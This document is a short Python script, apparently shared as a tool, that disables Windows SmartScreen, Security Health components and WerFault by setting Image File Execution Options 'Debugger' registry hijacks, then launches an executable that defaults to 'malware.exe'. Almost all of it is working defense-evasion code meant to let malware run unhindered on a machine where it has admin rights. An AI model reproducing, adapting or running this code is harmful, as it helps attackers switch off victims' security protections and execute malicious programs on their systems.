#######################################################################################
#
#   Block smartscreen and security center
#   © 2022 ABDULKADİR GÜNGÖR
#   Contact email address: abdulkadir_gungor@outlook.com
#
#	Developper:	Abdulkadir GÜNGÖR (abdulkadir_gungor@outlook.com)
#	Date:	30/05/2022
#
#######################################################################################
#
# First, It blocks the security center and smartscreen, and then it runs the file that is wanted to be run.
#
# The variable ("EXECUTABLE_FILE") in the SETTINGS class can be set (or)
# Give the script as input  ==> block.py "Executable_the_file_to_run"
#                               block.py malware.exe
#
#######################################################################################
import ctypes, sys, subprocess, time
from winreg import *

# settings
class SETTINGS:
    # [Static variable(s)]
    EXECUTABLE_FILE = "malware.exe"  # can be given as input to the program
    COUNTER = 11                     # [int] Waiting time for the prefetch  [more than 10 seconds]
    WAIT_TIME = 1                    # [Float] Waiting time between processes

# check admin privileges
def isAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# block smartscreen and security center
def blockSecurityCenter():
    smartscreen        = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smartscreen.exe'
    securityhealthhost = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\securityhealthhost.exe'
    secHealthUI        = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\secHealthUI.exe'
    werFault           = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\werFault.exe'
    reg_key = "Debugger"
    reg_value = "cmd.exe /C >null: 2>null:"
    # (1) smartscreen
    try:
        key1 = OpenKey(HKEY_LOCAL_MACHINE, smartscreen, 0, KEY_ALL_ACCESS)
    except:
        key1 = CreateKey(HKEY_LOCAL_MACHINE, smartscreen)
    SetValueEx(key1, reg_key, 0, REG_SZ, reg_value)
    CloseKey(key1)
    # (2) securityhealthhost
    try:
        key2 = OpenKey(HKEY_LOCAL_MACHINE, securityhealthhost, 0, KEY_ALL_ACCESS)
    except:
        key2 = CreateKey(HKEY_LOCAL_MACHINE, securityhealthhost)
    SetValueEx(key2, reg_key, 0, REG_SZ, reg_value)
    CloseKey(key2)
    # (3) secHealthUI
    try:
        key3 = OpenKey(HKEY_LOCAL_MACHINE, secHealthUI, 0, KEY_ALL_ACCESS)
    except:
        key3 = CreateKey(HKEY_LOCAL_MACHINE, secHealthUI)
    SetValueEx(key3, reg_key, 0, REG_SZ, reg_value)
    CloseKey(key3)
    # (4) werFault
    try:
        key4 = OpenKey(HKEY_LOCAL_MACHINE, werFault, 0, KEY_ALL_ACCESS)
    except:
        key4 = CreateKey(HKEY_LOCAL_MACHINE, werFault)
    SetValueEx(key4, reg_key, 0, REG_SZ, reg_value)
    CloseKey(key4)

# checking whether there is an input to the program
def checkArg():
    argv = sys.argv
    number = len(argv)
    if number == 2:
        tmp = argv[1].replace('"','')
        tmp = tmp.replace("'","")
        SETTINGS.EXECUTABLE_FILE = tmp

###--- Main ---###
if __name__ == '__main__':
    checkArg()
    counter = 0
    while counter <= SETTINGS.COUNTER:
        time.sleep(1)
        counter += 1
    time.sleep(SETTINGS.WAIT_TIME)
    checkpermission = isAdmin()
    if checkpermission:
        time.sleep(SETTINGS.WAIT_TIME)
        blockSecurityCenter()
        time.sleep(SETTINGS.WAIT_TIME)
        subprocess.run(SETTINGS.EXECUTABLE_FILE)
    else:
        print("You do not have admin rights!")






